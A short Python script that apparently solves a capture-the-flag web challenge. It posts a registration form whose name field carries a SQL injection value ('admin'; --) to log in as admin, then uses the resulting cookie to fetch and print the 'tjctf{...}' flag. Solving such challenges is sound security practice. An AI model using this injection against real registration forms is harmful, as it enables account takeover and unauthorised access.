import requests

url = "https://swill-squill-6f0ede3977003702.tjc.tf/register"

payload={"name": "admin'; --", 'grade': '10'}

response = requests.request("POST", url, data=payload)

print(response.text)

url = "https://swill-squill-6f0ede3977003702.tjc.tf/api"

response = requests.get(url, cookies=response.cookies)

text = response.text
idx = text.index("tjctf{")
flag = text[idx:text.index("}", idx) + 1]

print("Flag: " + flag)